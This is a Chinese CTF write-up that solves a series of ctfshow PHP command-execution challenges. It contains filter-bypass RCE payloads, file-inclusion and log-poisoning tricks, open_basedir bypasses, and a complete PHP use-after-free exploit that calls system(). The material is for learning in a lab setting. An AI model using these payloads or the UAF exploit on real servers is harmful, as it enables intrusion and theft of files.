# 命令执行

## web29

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

`/?c=system("ls");`，发现有`flag.php`，题目过滤了flag字符，`payload：/?c=system("cat fl*");`，然后查看源码就行。

## web30

```php
preg_match("/flag|system|php/i", $c)
```

`system`被过滤了，用`passthru`替换，`payload：/?c=passthru("cat fl*");`

## web31

```php
preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)
```

`cat`被过滤了，用`tac`替换，空格也过滤了，用`%09`绕过，`payload：/?c=passthru("tac%09fl*");`

## web32

```php
preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)
```

又过滤了`;`，用`?>`替换，连括号都过滤了，那只能用无括号函数，这里用include文件包含并且二次传参，`payload：/?c=include"$_GET[0]"?>&0=php://filter/read=convert.base64-encode/resource=flag.php`，最后进行base64解码

## web33

```php
preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)
```

又多过滤了一个双引号，将上一题的双引号去掉就行。`payload：/?c=include$_GET[0]?>&0=php://filter/read=convert.base64-encode/resource=flag.php`

## web34

```php
preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)
```

又多过滤了个冒号，无影响，payload同上一题

## web35

```php
preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)
```

又多加了小于号和等号，无影响，payload同上题

## web36

```php
preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)
```

有多过滤了数字，payload同上题，只要改二次传参的参数，`0`替换成`a`

## web37

```php
<?php
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

文件包含，用伪协议读文件，`payload：/?c=data://text/plain,<?php system("cat fl*"); ?>`，然后查看源码就行

也可以，`/?c=php://input    POST：<?php system("cat flag.php"); ?>`

## web38

```php
preg_match("/flag|php|file/i", $c)
```

多过滤了`php`和`file`，所以php标记不能直接用，那就编码绕过，最终

`payload：/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4=`

也可以用短标签`/?c=data://text/plain,<?=system("cat fl*")?>`

## web39

```php
if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
```

<!--data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用-->payload同上一题

## web40

```php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```

`$`被过滤了，不能`$_GET[]`二次传参，`/`被过滤，日志文件包含好像也不行了，注意这里的括号是中文括号，所以有括号的函数可以用，但是这里单双引号都被过滤，函数就不能直接传参，要用到[无参数读取文件](https://www.freebuf.com/articles/system/242482.html)的方法，

`/?c=print_r(scandir(current(localeconv())));`，产看当前目录所有文件名，返回如下，

```
Array ( [0] => . [1] => .. [2] => flag.php [3] => index.php )
```

然后读取文件`payload：/?c=show_source(next(array_reverse(scandir(current(localeconv())))));`

## web41

```php
<?php
if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?>
```

字母、数字都被过滤了，但是特意留了个或运算符`|`。我们可以尝试从ASCII为0-255的字符中，找到或运算能得到我们可用的字符的字符，例如`A %01|%40`，构造用到了WP给的脚本，

这里还要注意两个点，函数大小写不敏感，`('system')('ls')`可以等于`system('ls')`执行，可以手动构造，但要注意换行符，同样可以用脚本跑一下

## web42

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");//使输入的命令的执行结果导入到/dev/null，换言之就是与它相连的命令执行后没有回显
}else{
    highlight_file(__FILE__);
}
```

所以这里绕过方法是执行多条命令，`payload：/?c=cat flag.php;ls`

## web43

```php
if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

相较上一题，过滤了分号和`cat`，分号可以用管道符`||`替换，`cat`用`nl`或`tac`替换，`payload：/?c=tac flag.php||ls`

## web44

```php
if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

flag被过滤了，`*`绕过，`payload：/?c=tac fl*||ls`

## web45

```php
if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

空格被过滤了，绕过的办法有很多，这里采用`%09`，`payload：/?c=tac%09fl*||ls`

## web46

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

`*`又被过滤了，用单双引号或`\`绕过，`payload：/?c=tac%09fl''ag.php||ls`

## web47

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
    system($c." >/dev/null 2>&1");
  }
```

又过滤了些不影响的命令，payload同上一题

## web48

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

增加了过滤的内容，但都是一些无关紧要的命令，payload同上一题

## web49

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

换个payload，空格可以用`<`绕过，`/?c=tac<fl''ag.php||ls`

## web50

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

`\x09`被过滤了，空格就不能用`%09`绕过，payload可以用上一题

## web51

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

`tac`被过滤了，替换成`nl`，`payload：/?c=nl<fl''ag.php||ls`

## web52

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

`<`也被过滤了，但它又把`$`放出来了，所以`/?c=nl${IFS}fl''ag.php||ls`，但进去发现没有flag，说明flag不在`flag.php`，于是`/?c=ls${IFS}/||ls`，发现根目录下有一个`flag`文件，读取`/?c=nl${IFS}/fl''ag||ls`

## web53

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}
```

`payload：/?c=nl${IFS}fl\ag.php`

## web54

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
//“.*c.*a.*t.*”匹配有cat的字符串，只要字符串有这三个字母且顺序不变，例如“XcXXaXXtX”
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

`cat、tac、nl、more、less、head、tail`读取文件内容的命令全部被过滤了，这里有三种解法。

第一种，`paste`命令，合并文件并输出合并后文件内容

`payload：/?c=paste${IFS}fl??.php`

第二种，`mv`命令，将文件改名，并直接访问改名后文件

`payload：/?c=mv${IFS}f???.php${IFS}x.txt`

第三种，可以理解为当前目录运行`cat`命令实际上运行的也是`bin/cat`，而通配符不会帮你去找到`bin`下面的`cat`
只会在当前目录寻找能通配的文件，所以用通配符运行时必须给出路径

`payload：/?c=/bin/?at${IFS}f???.php`

## web55

```php
<?php
// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

过滤了字母，但没过滤数字，这一题与下一题都可以用无字母数字的RCE，但翻看其他师傅的做题记录时，看到一个相比较前者，更方便独特的方法，就是通过匹配`/bin`下存在的命令进行读取flag，这方法前面也用过，但实在没想到用到base64这个命令

```php
payload：/?c=/???/????64 ????.???                     也就是?c=/bin/base64 flag.php
```

## web56

```php
<?php
// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

做这一题，一定要深入研读一下[p神的这篇文章](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)，这里最主要的两点：

1、shell利用`.`执行脚本，用`. file`执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用`.`来执行它了吗？

2、我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是`/tmp/phpXXXXXX`，文件名最后6个字符是随机的大小写字母。然后我们可以用通配符去匹配执行这个文件，能够匹配上`/???/?????????`这个通配符的文件有很多，但干扰我们的文件的所有文件名都是小写，只有PHP生成的临时文件包含大写字母。所以我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。翻开ascii码表，可见大写字母位于`@`与`[`之间。

明白原理之后，就开始操作，首先构造一个post上传文件的数据包，

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://e4098f9c-7071-475c-9e45-5d143c1f1082.challenge.ctf.show:8080/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

上传文件，然后抓包，构造poc执行命令：`?c=.%20/???/????????[@-[]`

![image-20210714155357075](C:\Users\shuoke\AppData\Roaming\Typora\typora-user-images\image-20210714155357075.png)

接下来更改上传文件中的shell命令就行，每次上传的文件不一定有大写的文件名，有时需要多上传几次。

## web57

```php
<?php
// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}
```

两个通配符被过滤了，所以只能`$c="36"`，但数字又被过滤了，这里想办法构造36，因为没过滤`$`，所以可以用到以下方法：

> `$(())` 代表做一次运算，因为里面为空，也表示值为0
> `$((~$(())))` 对0作取反运算，值为-1
> `$(($((~$(())))$((~$(())))))` -1-1，也就是(-1)+(-1)为-2，所以值为-2
> `$((~$(($((~$(())))$((~$(())))))))` 再对-2做一次取反得到1，所以值为1

> `${_}`:代表上一次命令执行的结果，之前没有命令返回或者执行,结果应该是空,与`""`等价
> `$(())`: 做运算

36取反为-37，所以很容易构造，中间有37个`$((~$(())))`相加，`paylaod：/?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))`

## 29-57总结

> **过滤括号**
>
> `include`+二次传参<!--32-->
>
> **过滤引号：**<!--40-->
>
> 说明函数里不能加参数了，用无参数函数读取文件
>
> **无字母数字：**
>
> 1.位运算符没被过滤，采用位运算构造所需字符<!--41-->
>
> 2.通配符+`/bin`下命令<!--55-->
>
> 3.PHP5+shell(`. /???/????????[@-[]`)<!--56-->
>
> 4.shell里`$(())`<!--57-->

## web58

```php
<?php
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

程序执行函数被全部过滤，不能用webshell执行命令，那就用php的函数读取文件，

`payload：c=echo file_get_contents("flag.php");`；

换个姿势，`c=rename('flag.php','1.txt');`，然后直接访问`/1.txt`就行。

## web59

```php
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}
```

代码与上一题一样没有变化，但上一题的`file_get_contents()`函数被禁用了，换个姿势，`c=include($_GET[1]);`

`/?1=php://filter/convert.base64-encode/resource=flag.php`

## web60

代码无变化，继续换姿势`c=show_source("flag.php");`

## web61

代码无变化，换姿势`c=highlight_file('flag.php');`

## web62

代码无变化，换一个姿势解题，这里尝试用日志包含拿shell，首先在请求头的`User-Agent`写入一句话木马，`c=include($_GET[1]);&a=echo 'abcde'`，`/?1=/var/log/nginx/access.log`，成功拿到shell，接下就尝试写命令，后来想到程序执行函数都被过滤了，好像拿到这个shell也不能写命令，不过可以蚁剑直连。后面再想想，源码里好像有一个shell，可以直接蚁剑连接getshell。但不知道为什么蚁剑连进去，看不到文件里的内容。

## web63

代码没变，继续用`show_source()`函数，换种姿势`c=include('flag.php');echo $flag;`，`$flag`是`flag.php`文件中的变量，要先将文件包含进去，才能读取文件中的变量

## web64

代码没变，`show_source()`函数还没被禁用，可以继续用，换姿势，`c=include('flag.php');print_r(get_defined_vars());`，这里用到的函数：

```
get_defined_vars() — 返回由所有已定义变量所组成的数组
此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。
```

思路其实跟上一题差不多，先包含文件，再读取文件中的变量值。

## web65

代码没变，还可以用`show_source()`

## web66

代码没变，`show_source()`终于被禁了，`highlight_file()`仍然可用，但flag不在`flag.php`了，查找新文件的路径`c=print_r(scandir('/'));`，根目录下找到`flag.txt`，`payload：c=highlight_file('/flag.txt');`

## web67

代码不变，`print_r()`被禁了，替换成`var_dump()`，同样在根目录下找到`flag.txt`，payload同上一题

## web68

打卡页面，直接显示`highlight_file()`被禁用，我们还可以用`readgzfile()`，`c=readgzfile('/flag.txt');`。其它方法`c=include('/flag.txt');`，这里直接包含就行，因为不是php代码，所以文件包含把txt当html直接输出

## web69

这里查目录文件时，禁用了`var_dump()`，同样还有`var_export()`可用，上题两个payload都可以用

## web70

`var_export()`还可以用，文件名和路径没变，上题两个payload都还可以用

## web71

如之前一样进行操作，发现回显变成了一堆问号，下载附件，查看源码：

```php
<?php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);//会将字母数字替换成?
}else{
    highlight_file(__FILE__);
}
?>
```

一开始想当然去绕过无字母数字，利用位运算，参考web41，尝试发现不行，看代码，思考到只要`eval()`后面的语句不执行，就可以读取到flag，所以`c=include('/flag.txt');exit();`

## web72

附件的php源码无变化，尝试上一题的flag，回显发现读取这个文件失败，看来应该又改了文件名，这里用`c=var_export(scandir('/'));exit();`查看根目录，然后就看到这一句“open_basedir restriction in effect.”，这里用`open_basedir`限制了目录，果然如果查看当前目录是可以的，说明它限制为当前目录，

> open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开

`open_basedir`的设置对`system`等命令执行函数是无效的，可以使用命令执行函数来访问限制目录。但可惜这里都被禁用了。这里就要用到glob伪协议，

> glob://是php自5.3.0版本起开始生效的一个用来筛选目录的伪协议， 功能是查找匹配的文件路径模式。由于它在筛选目录时是不受open_basedir的制约的，所以我们可以利用它来绕过限制

```
c=$a = "glob:///*";//查找根目录下所有文件
  if ( $b = opendir($a) ) {
    while ( ($file = readdir($b)) !== false ) {
      echo $file."\n";
    }
    closedir($b);
  };exit();
//bin dev etc flag0.txt home lib media mnt opt proc root run sbin srv sys tmp usr var
```

```
c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");};exit();
```

这里有两种写法，成功找到`flag0.txt`，但还是没有办法读取这个文件，这要利用uaf的脚本进行命令执行，脚本如下(urlencode)：

```
c=function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { 

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }


    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");exit();
```

## web73

用`c=var_export(scandir('/'));exit();`查看根目录，发现文件名变成了`flagc.txt`，然后`c=include('flagc.txt');exit();`读取文件

## web74

`scandir()`被禁用了，用glob协议查看目录，

```
c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");};exit();
```

文件名又被改成`flagx.txt`，然后读文件`c=readgzfile('/flagx.txt');exit();`

## web75

用glob伪协议查看根目录，找到文件`flag36.txt`，`include`读文件发现`open_basedir`限制，尝试web72的uaf脚本，脚本中有函数被禁用了，好像这个方法也不行了，看了下题目给的hint，

```
c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',
'root');foreach($dbh->query('select load_file("/flag36.txt")') as $row)
{echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e-
>getMessage();exit(0);}exit(0);
```

php调用数据库的功能，这里利用MySQL的`load_file()`函数进行读取文件，可以绕过了`open_basedir`限制，注意这里要知道数据库的基本信息

## web76

用glob伪协议查看根目录，找到文件`flag36d.txt`，方法同上一题。

## web77

同样用glob伪协议查看根目录，找到文件`flag36x.txt`和`readflag`，尝试上一题的方法，发现也不行了，看hint，这里用到了FFI，php7.4以上才有。

> FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。

```
$ffi = FFI::cdef("int system(const char *command);");//创建一个system对象
$a='/readflag > 1.txt';//没有回显的
$ffi->system($a);//通过$ffi去调用system函数
```

这里如果直接执行读取`flag36x.txt`的命令，会发现没有回显，而恰好有一个`readflag`，猜测其为shell脚本，执行读取`flag36x.txt`，将其结果输出到`1.txt`，然后直接访问即可

## 58-77总结

> **输出打印数组的函数：**
>
> `print_r()`、`var_dump()`、`var_export()`
>
> **读取文件内容的函数：**
>
> `show_source()`、`highlight_file()`、`readfile()`：直接打印输出
>
> `file_get_contents()`：不直接输出，需要打印输出
>
> `readgzfile()`：读压缩文件，解压后输出；如果不是压缩文件，也可以直接读取输出
>
> `include()`：若是php代码，执行代码，读取源代码需要用伪协议；若不是php代码，其它格式当作html直接输出
>
> **查看文件目录的方法：**
>
> 1.`scandir()`配合上面输出打印数组的函数，进行扫目录
>
> 2.glob伪协议（可绕过open_basedir）
>
> **绕过open_basedir读文件：**
>
> 1.uaf脚本<!--72-->
>
> 2.MySQL的`load_file()`函数<!--75、76-->
>
> 3.php7.4以上的FFI，外部函数接口<!--77-->

## web118

打开靶机，查看源码，可以看到，所以这里直接输入命令就行，

![image-20210829115409874](C:\Users\shuoke\AppData\Roaming\Typora\typora-user-images\image-20210829115409874.png)

尝试了很多命令，都被过滤了，这里最好可以用脚本跑一下哪些被过滤了，实际上fuzz尝试之后发现只有大写字母和${}:?.~等等字符可以通过，所以这里可以使用bash内置变量

> **bash的内置命令**
>
> 1.BASH——bash的完整路径名。通常是：`/bin/bash`或`/usr/local/bin/bash`。
>
> 2.PWD——目前的工作目录
>
> 3.PATH——命令搜寻路径
>
> 4.HOME——目前使用者的home路径
>
> 5.IFS——定义字段分隔字符。默认值为：空格符、tab字符、换行符。

![image-20210829123432317](C:\Users\shuoke\AppData\Roaming\Typora\typora-user-images\image-20210829123432317.png)

```bash
echo ${PWD:0:1}      #从0下标开始的第一个字符
echo ${PWD:~0:1}     #从结尾开始往前的第一个字符
echo ${PATH:~0}
echo ${PATH:~A}      #字母A与0效果一样
```

所以可以构造`payload：${PATH:~A}${PWD:~A} ????.???`，

```
${PATH}：/var/www/html
${PWD}：/bin
${PATH:~A}${PWD:~A} ????.???   相当于   nl flag.php
```

